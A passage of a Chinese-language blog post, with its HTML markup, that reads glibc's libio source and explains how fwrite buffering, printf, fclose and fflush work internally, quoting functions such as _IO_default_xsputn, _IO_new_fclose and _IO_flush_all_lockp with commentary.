class="type">char</span> *) data + count);<span class="comment">//write_base后移</span></span><br><span class="line">    &#125;</span><br><span class="line">  n -= to_do;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_offset &gt;= <span class="number">0</span>)</span><br><span class="line">    f-&gt;_offset += n;</span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果buf全满了</p><p>又会使用_IO_do_flush,相当于调用_IO_do_write</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_do_flush(_f) \</span></span><br><span class="line"><span class="meta">  ((_f)-&gt;_mode &lt;= 0      \</span></span><br><span class="line"><span class="meta">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,      \</span></span><br><span class="line"><span class="meta">  (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)      \</span></span><br><span class="line"><span class="meta">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,      \</span></span><br><span class="line"><span class="meta">   ((_f)-&gt;_wide_data-&gt;_IO_write_ptr      \</span></span><br><span class="line"><span class="meta">    - (_f)-&gt;_wide_data-&gt;_IO_write_base)))</span></span><br></pre></td></tr></table></figure><h3 id="0x31"><a href="#0x31" class="headerlink" title="0x31"></a>0x31</h3><p>new_do_write</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos</span><br><span class="line">= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x4-IO-default-xsputn"><a href="#0x4-IO-default-xsputn" class="headerlink" title="0x4_IO_default_xsputn"></a>0x4_IO_default_xsputn</h2><ul><li><p>处理局部变量赋值，同时考虑写入 size 小于等于 0 的情况，直接返回 0</p></li><li><p>开始循环处理 data 数据</p><p>如果还有剩余缓存空间，计算剩余缓存空间数量 count</p><p>如果缓存空间比要写入的字节数量多，那就更新 count 为需要写入字节数；</p><p>如果需要写入字节数大于 20，那就调用__mempcpy 写入</p><p>否则就使用循环赋值的方式进行赋值（<strong>注意这里就是 Glibc 的精髓所在了，正常我们写代码可能就考虑循环赋值或者 memcpy 解决这个问题了，但是这里区分了情况，应该是考虑到了两者的性能差，为了达到最优情况，使用了分段处理的方式</strong>）</p></li><li><p>循环结束条件是剩余写入字符为 0，或调用_IO_OVERFLOW 写入 buffer 的同时写入下一个字符成功</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_default_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">char</span> *) data;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="keyword">if</span> (more &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Space available. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; more)</span><br><span class="line">        count = more;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">          s += count;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (count)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">          <span class="type">ssize_t</span> i;</span><br><span class="line">          <span class="keyword">for</span> (i = count; --i &gt;= <span class="number">0</span>; )</span><br><span class="line">        *p++ = *s++;</span><br><span class="line">          f-&gt;_IO_write_ptr = p;</span><br><span class="line">        &#125;</span><br><span class="line">      more -= count;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || _IO_OVERFLOW (f, (<span class="type">unsigned</span> <span class="type">char</span>) *s++) == EOF)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_xsputn)</span><br></pre></td></tr></table></figure><h2 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h2><p>调用栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">► f 0   0x7f6117fd43b0 write</span><br><span class="line">  f 1   0x7f6117f55c0f _IO_file_write+143</span><br><span class="line">  f 2   0x7f6117f5639a _IO_file_xsputn+426</span><br><span class="line">  f 3   0x7f6117f2cfa4 buffered_vfprintf+308</span><br><span class="line">  f 4   0x7f6117f2a33d vfprintf+445</span><br><span class="line">  f 5   0x7f6117f328a9 printf+153</span><br></pre></td></tr></table></figure><h2 id="puts"><a href="#puts" class="headerlink" title="puts"></a>puts</h2><p>调用栈与fwrite大致相同</p><h1 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h1><p>fclose实际上是_IO_new_fclose,位于libcio/iofclose.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_fclose (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line">  CHECK_FILE(fp, EOF);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">  <span class="comment">/* We desperately try to help programs which are using streams in a</span></span><br><span class="line"><span class="comment">     strange way and mix old and new functions.  Detect old streams</span></span><br><span class="line"><span class="comment">     here.  */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_old_fclose (fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This stream has a wide orientation.  This means we have to free</span></span><br><span class="line"><span class="comment"> the conversion functions.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> =</span> fp-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">      __libc_lock_lock (__gconv_lock);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_in.step);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_out.step);</span><br><span class="line">      __libc_lock_unlock (__gconv_lock);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">_IO_free_backup_area (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_deallocate_file (fp);</span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x1-3"><a href="#0x1-3" class="headerlink" title="0x1"></a>0x1</h2><p>首先调用_IO_un_link将_IO_FILE从_IO_list_all解除,文件位于libio/gneops.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_un_link (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;file._flags &amp; _IO_LINKED)</span><br><span class="line">    &#123;</span><br><span class="line">      FILE **f;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (FILE *) fp;</span><br><span class="line">      _IO_flockfile ((FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">if</span> (_IO_list_all == <span class="literal">NULL</span>)</span><br><span class="line">;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (fp == _IO_list_all)</span><br><span class="line">_IO_list_all = (<span class="keyword">struct</span> _IO_FILE_plus *) _IO_list_all-&gt;file._chain;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line"><span class="keyword">for</span> (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)</span><br><span class="line">  <span class="keyword">if</span> (*f == (FILE *) fp)</span><br><span class="line">    &#123;</span><br><span class="line">      *f = fp-&gt;file._chain;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      fp-&gt;file._flags &amp;= ~_IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>遍历寻找当前_IO_FILE将其解链</p><p>并进行其他一些参数设置</p><h2 id="0x2-3"><a href="#0x2-3" class="headerlink" title="0x2"></a>0x2</h2><p>再往后便是_IO_FINISH,其也是一个调用vtable中函数的宏</p><p>其调用的是_IO_new_file_finish,位于libio/fileops.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_new_file_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_file_is_open (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_do_flush (fp);</span><br><span class="line">      <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_DELETE_DONT_CLOSE))</span><br><span class="line">_IO_SYSCLOSE (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_do_flush会将_IO_FILE中的缓存输出</p><p>之后再调用系统调用close关闭文件流</p><p>再运行_IO_default_finish</p><p>位于libcio/genops.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_default_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *<span class="title">mark</span>;</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_IO_buf_base);</span><br><span class="line">      fp-&gt;_IO_buf_base = fp-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (mark = fp-&gt;_markers; mark != <span class="literal">NULL</span>; mark = mark-&gt;_next)</span><br><span class="line">    mark-&gt;_sbuf = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_save_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">    _IO_lock_fini (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>删除缓冲区并再次_IO_unlink</p><h2 id="0x3-3"><a href="#0x3-3" class="headerlink" title="0x3"></a>0x3</h2><p>回到_IO_new_fclose</p><p>在设置一些参数之后最后调用_IO_deallocate_file</p><p>其位于libio/libioP.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span></span><br><span class="line">_IO_deallocate_file (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The current stream variables.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp == (FILE *) &amp;_IO_2_1_stdin_ || fp == (FILE *) &amp;_IO_2_1_stdout_</span><br><span class="line">      || fp == (FILE *) &amp;_IO_2_1_stderr_)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_legacy_file (fp))</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="built_in">free</span> (fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查要关闭的_IO<em>FILE是否为_IO_2_1_stdin\</em> ||_IO<em>2_1_stdout\</em>||_IO<em>2_1_stderr</em></p><p>是则直接返回,因为这三个流并不在堆上</p><p>否则的话该文件流就应该位于堆上,对其进行free</p><p>大致就是这么个流程</p><h1 id="fflush"><a href="#fflush" class="headerlink" title="fflush"></a>fflush</h1><p> fflush</p><p>刷新文件流函数,将输write缓冲区中的未写入数据刷新到文件中</p><p>给定需要刷新的 FILE 指针，关闭成功返回 0,失败返回 EOF(-1)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int fflush ( FILE * stream );</span><br></pre></td></tr></table></figure><p>如果当前的 stream 是为写入打开的，或者为了更新打开的且最后一个 io 操作是 output，那么任何在 outbuffer 中未写入的数据都将会被写入到文件中；如果 stream 是空指针，那么所有的 stream 将会被 flush。</p><p>fflush由_IO_fflush实现,位于libio/iofflush.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_fflush (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_flush_all ();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> result;</span><br><span class="line">      CHECK_FILE (fp, EOF);</span><br><span class="line">      _IO_acquire_lock (fp);</span><br><span class="line">      result = _IO_SYNC (fp) ? EOF : <span class="number">0</span>;</span><br><span class="line">      _IO_release_lock (fp);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_fflush)</span><br></pre></td></tr></table></figure><h2 id="0x1all分支"><a href="#0x1all分支" class="headerlink" title="0x1all分支"></a>0x1all分支</h2><p>_IO_flush_all位于libio/genops.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* We want locking.  */</span></span><br><span class="line">  <span class="keyword">return</span> _IO_flush_all_lockp (<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_flush_all)</span><br></pre></td></tr></table></figure><p>纯调用_IO_flush_all_lockp(1),不过高版本开始\取消_IO_flush_all_lockp,其所有功能由_IO_flush_all直接完成</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  FILE *fp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);<span class="comment">//上锁</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">_IO_flockfile (fp);<span class="comment">//上锁</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);<span class="comment">//解锁</span></span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查当前 FILE 对象的情况，如果是以下两种情况：</p><ul><li>(fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO<em>write_ptr &gt; fp-&gt;_IO_write_base)</em>非宽字符</li><li>_(_IO_vtable_offset (fp) == 0&amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr&gt; fp-&gt;_wide_data-&gt;_IO_write_base))宽字符</li></ul><p>则会调用_IO_OVERFLOW (fp, EOF)</p><p>_IO_OVERFLOW (fp, EOF)就是调用对应 fp 的函数指针实现对应的写入功能，最后实际调用到了_IO_do_write，将 f-&gt;_IO_write_base 开始，长度为（f-&gt;_IO_write_ptr - f-&gt;_IO_write_base）的数据写入文件,之前有提到过,这里不展开</p><h2 id="0x2指定fp分支"><a href="#0x2指定fp分支" class="headerlink" title="0x2指定fp分支"></a>0x2指定fp分支</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> result;</span><br><span class="line">    CHECK_FILE (fp, EOF);</span><br><span class="line">    _IO_acquire_lock (fp);<span class="comment">//上锁</span></span><br><span class="line">    result = _IO_SYNC (fp) ? EOF : <span class="number">0</span>;</span><br><span class="line">    _IO_release_lock (fp);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="1-CHECK-FILE"><a href="#1-CHECK-FILE" class="headerlink" title="1.CHECK_FILE"></a>1.CHECK_FILE</h3><p>检查 FILE 对象是否合法，包括是否空指针，_flags 是否在合法范围内。</p><figure 